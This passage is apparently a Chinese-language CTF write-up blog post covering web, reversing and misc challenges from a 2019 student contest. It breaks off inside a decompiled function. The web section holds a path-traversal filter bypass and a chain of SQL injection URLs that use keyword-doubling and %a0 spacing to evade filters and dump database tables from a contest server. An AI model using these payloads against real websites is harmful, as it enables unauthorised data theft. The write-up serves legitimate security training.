<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>2019-ZJGSUCTF | AssassinQ</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="ctfwp">
  
  
  
  
  <meta name="description" content="一晃一年过去了，今年的个人赛肝的有点累。">
<meta name="keywords" content="ctf,wp">
<meta property="og:type" content="article">
<meta property="og:title" content="2019-ZJGSUCTF">
<meta property="og:url" content="https://qianfei11.github.io/2019/05/12/2019-ZJGSUCTF/index.html">
<meta property="og:site_name" content="AssassinQ">
<meta property="og:description" content="一晃一年过去了，今年的个人赛肝的有点累。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://qianfei11.github.io/pics/2019-ZJGSUCTF/AlphaStop.png">
<meta property="og:updated_time" content="2019-08-26T01:16:05.627Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="2019-ZJGSUCTF">
<meta name="twitter:description" content="一晃一年过去了，今年的个人赛肝的有点累。">
<meta name="twitter:image" content="https://qianfei11.github.io/pics/2019-ZJGSUCTF/AlphaStop.png">
  
    <link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml">
  
  <link rel="icon" href="/css/images/favicon.ico">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
    
  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">

  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
  <link rel="stylesheet" href="/css/style.css">

  <script src="/js/jquery-3.1.1.min.js"></script>

  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css">
  <link rel="stylesheet" href="/css/fashion.css">
  <link rel="stylesheet" href="/css/glyphs.css">

</head>
</html>


  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  
  <div class="site-header-image">
    <img id="originBg" width="100%" alt="Hike News" src>
  </div>

  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
  </div>

  <script>
        var imgUrls = "css/images/pose01.jpg".split(",");
        var random = Math.floor((Math.random() * imgUrls.length ));
        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
          document.getElementById("originBg").src=imgUrls[random];
          document.getElementById("blurBg").src=imgUrls[random];
        } else {
          document.getElementById("originBg").src='/' + imgUrls[random];
          document.getElementById("blurBg").src='/' + imgUrls[random];
        }
    </script>




<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
  <div class="clearfix container">
      <div class="site-branding">

          <h1 class="site-title">
            
              <a href="/" title="AssassinQ" rel="home"> AssassinQ </a>
            
          </h1>
          
          
            <div class="site-description">ZJGSU-IS-17</div>
          
            
          <nav id="main-navigation" class="main-navigation" role="navigation">
            <a class="nav-open">Menu</a>
            <a class="nav-close">Close</a>

            <div class="clearfix sf-menu">
              <ul id="main-nav" class="menu sf-js-enabled sf-arrows" style="touch-action: pan-y;">
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/">Home</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/archives">Archives</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/tags">Tags</a> </li>
                    
                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class href="/about">About</a> </li>
                    
              </ul>
            </div>
          </nav>

      </div>
  </div>
</header>


  <div id="container">
    <div id="wrap">
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-2019-ZJGSUCTF" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost">
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      2019-ZJGSUCTF
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2019/05/12/2019-ZJGSUCTF/" class="article-date">
	  <time datetime="2019-05-12T15:45:39.000Z" itemprop="datePublished">May 12, 2019</time>
	</a>

       
      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>一晃一年过去了，今年的个人赛肝的有点累。</p>
<a id="more"></a>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="100-分的题目就不想名字了"><a href="#100-分的题目就不想名字了" class="headerlink" title="100 分的题目就不想名字了"></a>100 分的题目就不想名字了</h2><p>任意文件读取，<code>../</code>被过滤了，要双写绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.21.13.190:22222/index.php?dir=.....///.....///.....///flag/flag1.txt</span><br></pre></td></tr></table></figure>
<h2 id="我苦心锻炼了三年"><a href="#我苦心锻炼了三年" class="headerlink" title="我苦心锻炼了三年"></a>我苦心锻炼了三年</h2><p>sql 注入，过滤了<code>and</code>、<code>or</code>（双写绕过）以及空格（<code>%a0</code>）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://10.21.13.190:23579/youseesee.php?id=1%27%29anandd%271%27%3D%271%27%23</span><br><span class="line">http://10.21.13.190:23579/youseesee.php?id=1%27)%a0oorrder%a0by%a03%23</span><br><span class="line">http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,database()%23</span><br><span class="line">http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%23</span><br><span class="line">http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()anandd%a0table_name=&apos;N0_Ga3E_N0_1ife&apos;%23</span><br><span class="line">http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(0ne9unch3an)%a0from%a0N0_Ga3E_N0_1ife%23</span><br></pre></td></tr></table></figure>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Click"><a href="#Click" class="headerlink" title="Click"></a>Click</h2><p>VB 程序，要求点击十万次就能拿到 flag。VB 动态调起来基本都在 dll 里绕来绕去，直接用 ida。找到<code>cmp edx, 186A0h</code>的地方，用<a href="https://github.com/keystone-engine/keypatch" target="_blank" rel="noopener">keypatch</a>改成<code>cmp edx, 10h</code>，保存到文件之后，点十六下就能拿到 flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:004139DF                 mov     eax, 0Ah</span><br><span class="line">.text:004139E4                 mov     ecx, 80020004h</span><br><span class="line">.text:004139E9                 mov     [ebp+var_FF0], eax</span><br><span class="line">.text:004139EF                 mov     [ebp+var_FE0], eax</span><br><span class="line">.text:004139F5                 mov     [ebp+var_FD0], eax</span><br><span class="line">.text:004139FB                 mov     eax, [ebp+var_B4C]</span><br><span class="line">.text:00413A01                 mov     [ebp+var_FE8], ecx</span><br><span class="line">.text:00413A07                 mov     [ebp+var_FD8], ecx</span><br><span class="line">.text:00413A0D                 mov     [ebp+var_FC8], ecx</span><br><span class="line">.text:00413A13                 lea     edx, [ebp+var_1000]</span><br><span class="line">.text:00413A19                 lea     ecx, [ebp+var_FC0]</span><br><span class="line">.text:00413A1F                 mov     [ebp+var_FF8], eax</span><br><span class="line">.text:00413A25                 mov     [ebp+var_1000], 8</span><br><span class="line">.text:00413A2F                 call    ds:__vbaVarDup</span><br></pre></td></tr></table></figure>
<p>或者在代码段可以看到<code>mov eax, [ebp+var_B4C]</code>，在那堆字符串里找到对应的 flag：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:004121DD                 mov     edx, offset aFlagIMJessicaB ; &quot;flag&#123;I&apos;m Jessica Banks&#125;&quot;</span><br><span class="line">.text:004121E2                 lea     ecx, [ebp+var_B4C]</span><br><span class="line">.text:004121E8                 call    esi ; __vbaStrCopy</span><br></pre></td></tr></table></figure>
<p>试了一下把每点一次的次数改大一点，发现不可能点出来。因为次数用的是有符号 int 存的，最大也就 32767，再大就变成负数-32767 了。</p>
<h2 id="Message-Digest"><a href="#Message-Digest" class="headerlink" title="Message-Digest"></a>Message-Digest</h2><p><code>upx -d</code>脱一下壳，gdb 调一下就大概知道是怎么回事了。直接爆破：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">length = <span class="number">6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000</span>, <span class="number">1000000</span>):</span><br><span class="line">    res = hashlib.md5(str(i) + <span class="string">'re200'</span>).hexdigest().upper()</span><br><span class="line">    <span class="keyword">print</span> res</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">'6941162AC29D59EBC6C3737D296359B2'</span>:</span><br><span class="line">        <span class="keyword">print</span> i, <span class="string">'Success!'</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h2 id="POKPOK"><a href="#POKPOK" class="headerlink" title="POKPOK"></a>POKPOK</h2><p>网上整一个满级号存档，然后<a href="http://www.pokemon.name/thread-457280-1-1.html" target="_blank" rel="noopener">金手指</a>直接跳到打五大天王，打通后找到 flag。</p>
<p>或者直接用<code>Advance Map</code>查看地图就能找到 flag。</p>
<h2 id="COFFEE"><a href="#COFFEE" class="headerlink" title="COFFEE"></a>COFFEE</h2><p><code>jadx</code>反编译一下发现是在 native 层进行了加密。反编译一下资源里的<code>.so</code>文件。</p>
<p>看到 data 段给了一半被加密了的 flag，然后将输入的信息和前 16 位异或之后得到正确的 flag。</p>
<p>然后中间还有一个对输入的 check，正确的输入经过一个<code>encrypt</code>函数加密后得到的内容与 data 段中给出的另一段密文相等。加密函数如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">encrypt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> __int8 *key, <span class="keyword">unsigned</span> __int8 *buf, <span class="keyword">int</span> num_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [sp+Ch] [bp-3Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [sp+10h] [bp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// [sp+14h] [bp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [sp+18h] [bp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> j; <span class="comment">// [sp+20h] [bp-28h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [sp+24h] [bp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+28h] [bp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [sp+2Ch] [bp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// [sp+30h] [bp-18h]</span></span><br><span class="line"></span><br><span class="line">  v7 = bswap32(*(_DWORD *)key);</span><br><span class="line">  v6 = bswap32(*((_DWORD *)key + <span class="number">1</span>));</span><br><span class="line">  v5 = bswap32(*((_DWORD *)key + <span class="number">2</span>));</span><br><span class="line">  v4 = bswap32(*((_DWORD *)key + <span class="number">3</span>));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; num_2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v12 = bswap32(*(_DWORD *)&amp;buf[<span class="number">8</span> * i]);</span><br><span class="line">    v11 = bswap32(*(_DWORD *)&amp;buf[<span class="number">8</span> * i + <span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">0x1F</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v10 -= <span class="number">0x61C88647</span>;</span><br><span class="line">      v12 += (v6 + (v11 &gt;&gt; <span class="number">5</span>)) ^ (v7 + <span class="number">16</span> * v11) ^ (v10 + v11);</span><br><span class="line">      v11 += (v4 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v5 + <span class="number">16</span> * v12) ^ (v10 + v12);</span><br><span class="line">    &#125;</span><br><span class="line">    buf[<span class="number">8</span> * i] = HIBYTE(v12);</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">1</span>] = BYTE2(v12);</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">2</span>] = BYTE1(v12);</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">3</span>] = v12;</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">4</span>] = HIBYTE(v11);</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">5</span>] = BYTE2(v11);</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">6</span>] = BYTE1(v11);</span><br><span class="line">    buf[<span class="number">8</span> * i + <span class="number">7</span>] = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加密函数中，<code>v10</code>显然是个常数，每一轮的值是固定的，而<code>v11</code>和<code>v12</code>也只是被之前得到的数值进行了加减操作，显然是可逆的。最需要注意的就是大小端。Solve：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">enc = [<span class="number">0x3C</span>, <span class="number">0x26</span>, <span class="number">0x26</span>, <span class="number">0x34</span>, <span class="number">0x2E</span>, <span class="number">0x0F</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x6E</span>, <span class="number">0x20</span>, <span class="number">0x73</span>, <span class="number">0x2B</span>, <span class="number">0x34</span>, <span class="number">0x3C</span>, <span class="number">0x20</span>, <span class="number">0x4A</span>, <span class="number">0x20</span>, <span class="number">0x53</span>, <span class="number">0x4F</span>, <span class="number">0x4D</span>, <span class="number">0x45</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x41</span>, <span class="number">0x21</span>, <span class="number">0x7D</span>]</span><br><span class="line">key = [<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>]</span><br><span class="line">buf = [<span class="number">0xAB</span>, <span class="number">0x7D</span>, <span class="number">0x9A</span>, <span class="number">0xF9</span>, <span class="number">0x72</span>, <span class="number">0x86</span>, <span class="number">0x55</span>, <span class="number">0xF6</span>, <span class="number">0x8F</span>, <span class="number">0xBC</span>, <span class="number">0x39</span>, <span class="number">0x58</span>, <span class="number">0x28</span>, <span class="number">0x88</span>, <span class="number">0xD8</span>, <span class="number">0x09</span>]</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span><span class="params">(array)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(array) != <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'[*] Length is not correct!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">            res += array[i]</span><br><span class="line">            res = res * <span class="number">0x100</span></span><br><span class="line">        <span class="keyword">return</span> res / <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unpack</span><span class="params">(dword)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        t = dword &amp; <span class="number">0xff</span></span><br><span class="line">        dword &gt;&gt;= <span class="number">8</span></span><br><span class="line">        res.append(t)</span><br><span class="line">    res = res[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(pack([0x12, 0x34, 0x56, 0x78]))</span></span><br><span class="line"><span class="comment">#t = unpack(0x12345678)</span></span><br><span class="line"><span class="comment">#print t</span></span><br><span class="line"><span class="comment">#for x in t:</span></span><br><span class="line"><span class="comment">#    print hex(x)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(key, buf, num=<span class="number">2</span>)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Decryption:'</span></span><br><span class="line">    v7 = pack(key[<span class="number">0</span>:<span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">print</span> hex(v7)</span><br><span class="line">    v6 = pack(key[<span class="number">4</span>:<span class="number">8</span>][::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">print</span> hex(v6)</span><br><span class="line">    v5 = pack(key[<span class="number">8</span>:<span class="number">12</span>][::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">print</span> hex(v5)</span><br><span class="line">    v4 = pack(key[<span class="number">12</span>:<span class="number">16</span>][::<span class="number">-1</span>])</span><br><span class="line">    <span class="keyword">print</span> hex(v4)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'encrypt:'</span>,</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> buf:</span><br><span class="line">        <span class="keyword">print</span> hex(x),</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        v11 = pack(buf[<span class="number">8</span>*(<span class="number">1</span>-i)+<span class="number">4</span>:<span class="number">8</span>*(<span class="number">1</span>-i)+<span class="number">8</span>][::<span class="number">-1</span>])</span><br><span class="line">        v12 = pack(buf[<span class="number">8</span>*(<span class="number">1</span>-i):<span class="number">8</span>*(<span class="number">1</span>-i)+<span class="number">4</span>][::<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'v11:'</span>, hex(v11)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'v12:'</span>, hex(v12)</span><br><span class="line">        v10 = <span class="number">0xc6ef3720</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x20</span>):</span><br><span class="line">            v11 -= (v4 + (v12 &gt;&gt; <span class="number">5</span>)) ^ (v5 + <span class="number">16</span> * v12) ^ (v10 + v12)</span><br><span class="line">            v11 = v11 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v12 -= (v6 + (v11 &gt;&gt; <span class="number">5</span>)) ^ (v7 + <span class="number">16</span> * v11) ^ (v10 + v11)</span><br><span class="line">            v12 = v12 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v10 += <span class="number">0x61C88647</span></span><br><span class="line">            v10 = v10 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"><span class="comment">#            print 'Round', 0x20-j, 'v11:', hex(v11), 'v12:', hex(v12)</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Origin v11:'</span>, hex(v11)</span><br><span class="line">        res.extend(unpack(v11)[::<span class="number">-1</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Origin v12:'</span>, hex(v12)</span><br><span class="line">        res.extend(unpack(v12)[::<span class="number">-1</span>])</span><br><span class="line">    res = res[::<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'plain:'</span>,</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> res:</span><br><span class="line">        <span class="keyword">print</span> hex(x),</span><br><span class="line">    <span class="keyword">print</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="keyword">print</span> <span class="string">'----------HERE ARE THE RESULT----------'</span></span><br><span class="line">res = decrypt(key, buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">    flag += chr(enc[i] ^ res[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>, len(enc)):</span><br><span class="line">    flag += chr(enc[i])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag ==&gt;'</span>, flag</span><br></pre></td></tr></table></figure>
<p>其实根据<code>encrypt</code>函数中<code>v10</code>减去的值可以判断出加密算法是 TEA，被魔改成了两轮加密。</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>复制粘贴 flag。</p>
<h2 id="Differ"><a href="#Differ" class="headerlink" title="Differ"></a>Differ</h2><p>通过判断文件的 md5 值来 diff：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">diff = []</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    name = str(i) + <span class="string">'.txt'</span></span><br><span class="line">    f = open(name, <span class="string">'rb'</span>)</span><br><span class="line">    content = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    t = hashlib.md5(content).digest().encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">if</span> t <span class="keyword">in</span> diff:</span><br><span class="line">        <span class="keyword">print</span> name, t, <span class="string">'is in diff'</span></span><br><span class="line">    diff.append(t) <span class="comment"># dbfe6da0f40487d84dbc2b139f727a31</span></span><br><span class="line">    <span class="keyword">if</span> t == <span class="string">'dbfe6da0f40487d84dbc2b139f727a31'</span>:</span><br><span class="line">        <span class="keyword">print</span> name</span><br><span class="line">        flag += str(i)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure>
<h2 id="PACMAN"><a href="#PACMAN" class="headerlink" title="PACMAN"></a>PACMAN</h2><p>反编译一下在<code>MainLoop</code>函数里找到 flag：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">MainLoop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  DrawWindow();</span><br><span class="line">  wrefresh(win);</span><br><span class="line">  wrefresh(status);</span><br><span class="line">  usleep(<span class="number">0xF4240</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    